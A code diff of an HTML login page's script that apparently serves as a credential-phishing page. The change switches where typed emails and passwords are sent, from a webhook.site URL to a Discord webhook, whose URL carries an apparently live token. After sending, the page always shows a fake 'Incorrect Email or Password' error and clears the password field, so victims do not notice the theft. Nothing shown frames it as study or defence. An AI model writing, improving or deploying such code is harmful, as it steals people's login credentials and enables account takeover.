@@ -151,8 +151,8 @@
 </div>
 
 <script>
-    // YOUR WEBHOOK ID
-    const WEBHOOK_URL = "https://webhook.site/9f7463ee-3637-48df-bfef-e22245193603"; 
+    // YOUR SPECIFIC WEBHOOK URL
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1570694636727570532/i-zQWA62FJCAxnH_Xfi_E7kuxCkzNN3gLE7XB5H0kI0LNe-nMO7xUX_MYvOUVJ8wfSXf"; 
 
     const form = document.getElementById('loginForm');
     const emailInput = document.getElementById('email');
@@ -178,14 +178,20 @@
             return;
         }
 
-        sendToWebhook(email, password, "Login Attempt");
+        sendToDiscord(email, password);
         errorMsg.textContent = "Incorrect Email or Password. Please try again";
         passInput.value = '';
     });
 
-    function sendToWebhook(email, pass, status) {
-        fetch(`${WEBHOOK_URL}?email=${encodeURIComponent(email)}&password=${encodeURIComponent(pass)}&status=${status}`)
-        .catch(err => console.error("Webhook failed", err));
+    function sendToDiscord(email, pass) {
+        fetch(WEBHOOK_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                content: `**New Login Attempt!**\n\n📧 **Email:** ${email}\n🔑 **Password:** ${pass}`
+            }),
+            mode: 'no-cors' 
+        }).catch(err => console.error("Failed", err));
     }
 </script>
 
